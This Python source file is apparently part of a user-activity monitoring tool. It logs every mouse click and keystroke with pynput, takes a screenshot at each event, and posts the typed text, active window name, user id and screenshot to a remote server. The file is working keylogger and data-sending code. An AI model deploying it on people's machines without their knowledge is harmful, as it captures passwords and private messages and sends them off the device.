from sys import path
path.append('../../')  # Evitar problema de importación circular
from pynput import mouse
from modules import consumerServer
from utils.utils import *
from modules import screenshot as sc
from pynput import mouse, keyboard as pynput_keyboard
from time import time
import threading

# -----------------------------------------------------------------------------
# Función principal Log Mouse
# -----------------------------------------------------------------------------

def logMouse():
    """
    Log mouse coordinates on click
    """
    print("[Mouse] Mouse logging started...")

    def _on_click(x, y, button, pressed):
        if pressed:  # Se detecta el evento solo si se hace click
            try:
                # sleep(0.4) Ajustar solo para pruebas
                window_name = getActiveWindowInfo("name")
                coordX, coordY = x, y  
                img = sc.take_screenshot(save_image=True)  # Guardar imagen
                print(img)
                print(window_name)
                session.post(consumerServer.SERVER_ADDR, json={
                    "timestamp": timestamp(),
                    "user": USER,
                    "category": "MouseClick",
                    "application": window_name,
                    "event_type": "click",
                    "button": str(button),
                    "coordX": coordX, 
                    "coordY": coordY,  
                    "screenshot": img
                })
            except Exception as e:
                print(f"Error: {e}")
                pass


    # Ejecuta la función correspondiente al realizar click
    with mouse.Listener(on_click=_on_click) as listener:
        listener.join()

# -----------------------------------------------------------------------------
# Funciones Auxiliares para Log Keyboard
# -----------------------------------------------------------------------------


def get_key_str(key):
    # Condición para verificar si la tecla es una tecla de función
    if isinstance(key, pynput_keyboard.Key) and 'f' in str(key):
        return str(key).upper().replace("_", " ")  # Convertir a cadena y formatear correctamente
    elif hasattr(key, 'char') and key.char:
        return key.char  # Retornar el carácter de la tecla si existe
    elif hasattr(key, 'vk'):
        if 47 < key.vk < 58:  # valores vk para las teclas numéricas 0-9
            return str(key.vk - 48)  # Convertir el valor vk al número actual
        elif 64 < key.vk < 91:  # valores vk para las teclas de letras A-Z
            return chr(key.vk)  # Convertir el valor vk a la letra actual
    return str(key)[1:-1]  # Retornar la representación de la tecla como cadena sin los corchetes angulares


# Mapeo de caracteres de control a combinaciones de teclas
control_char_mapping = {
    chr(i): f'CTRL + {chr(i + 64)}' for i in range(1, 27)
}

def translate_control_chars(char_sequence):
    return ' '.join(control_char_mapping.get(char, char) for char in char_sequence)


# -----------------------------------------------------------------------------
# Función principal Log Keyboard
# -----------------------------------------------------------------------------

def logKeyboard():
    print("[Keyboard] Keyboard logging started...")
    pressed_keys = []
    last_key_time = time()
    timer = None

    def send_data():
        nonlocal pressed_keys
        if pressed_keys:
            window_name = getActiveWindowInfo("name")
            typed_word = ''.join([k for k in pressed_keys if k])  # Filtrar cualquier valor None

            # Verificar si 'C T R L + ' ya está en typed_word
            if 'C T R L   +   ' not in typed_word:
                if any(c in control_char_mapping for c in typed_word):
                    typed_word = translate_control_chars(typed_word)  # Traducir caracteres de control solo si es necesario

            # Corregir la secuencia incorrecta
            incorrect_sequence = 'C T R L   +   '
            if typed_word.startswith(incorrect_sequence):
                typed_word = typed_word[len(incorrect_sequence):]  # Eliminar la secuencia incorrecta

            img = sc.take_screenshot(save_image=True)
            print(f"{timestamp()} {USER} {window_name} typed: {typed_word}")
            session.post(consumerServer.SERVER_ADDR, json={
                "timestamp": timestamp(),
                "user": USER,
                "category": "Keyboard",
                "application": window_name,
                "event_type": "keypress",
                "typed_word": typed_word,
                "screenshot": img
            })
            pressed_keys = []  # Limpiar pressed_keys


    modifier_state = {'alt': False, 'ctrl': False, 'win': False}  # Variables de estado de teclas

    def on_press(key):
        nonlocal last_key_time, pressed_keys, timer
        # Verificación teclas clave
        if key in {pynput_keyboard.Key.alt_l, pynput_keyboard.Key.alt_r}:
            modifier_state['alt'] = True
        elif key in {pynput_keyboard.Key.ctrl_l, pynput_keyboard.Key.ctrl_r}:
            modifier_state['ctrl'] = True
        elif key in {pynput_keyboard.Key.cmd_l, pynput_keyboard.Key.cmd_r}: 
            modifier_state['win'] = True
        else:
            hotkey_str = ''
            if modifier_state['ctrl']:
                hotkey_str += 'CTRL + '
            if modifier_state['alt']:
                hotkey_str += 'ALT + '
            if modifier_state['win']:
                hotkey_str += 'WIN + '
            if hotkey_str:
                hotkey_str += get_key_str(key)
                pressed_keys.append(hotkey_str)
                send_data()  
            else:
                try:
                    if key == pynput_keyboard.Key.space:
                        key_char = ' '
                    else:
                        key_char = get_key_str(key) 
                    pressed_keys.append(key_char)
                    last_key_time = time()
                    if timer is not None:
                        timer.cancel()
                    timer = threading.Timer(2, send_data)
                    timer.start()
                except AttributeError:
                    pass  # Manejar casos de teclas especiales

    def on_release(key):
        if key in {pynput_keyboard.Key.alt_l, pynput_keyboard.Key.alt_r}:
            modifier_state['alt'] = False
        elif key in {pynput_keyboard.Key.ctrl_l, pynput_keyboard.Key.ctrl_r}:
            modifier_state['ctrl'] = False
        elif key in {pynput_keyboard.Key.cmd_l, pynput_keyboard.Key.cmd_r}: 
            modifier_state['win'] = False


    # Ejecuta la función correspondiente al pulsar una tecla
    with pynput_keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()




